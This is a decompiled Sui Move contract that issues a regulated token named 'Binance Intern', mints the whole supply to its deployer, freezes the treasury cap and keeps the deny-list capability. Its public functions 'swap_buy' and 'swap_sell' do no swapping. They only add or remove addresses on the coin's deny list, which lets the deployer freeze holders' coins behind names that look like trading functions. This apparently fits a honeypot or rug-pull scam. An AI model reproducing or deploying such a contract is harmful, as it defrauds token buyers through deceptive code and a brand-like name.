module 0xd93150b8de66f33d0c624470b2a6c7608cefb2a3b1af7101dbcd711a749295d1::intern {
    struct INTERN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: INTERN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<INTERN>(arg0, 9, b"Intern", b"Binance Intern", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNTT3MN84ze2P4VeEcJ2DMvfRHg94e7SR4LgQbnfWgKDG"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<INTERN>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<INTERN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<INTERN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<INTERN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<INTERN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<INTERN>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<INTERN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<INTERN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

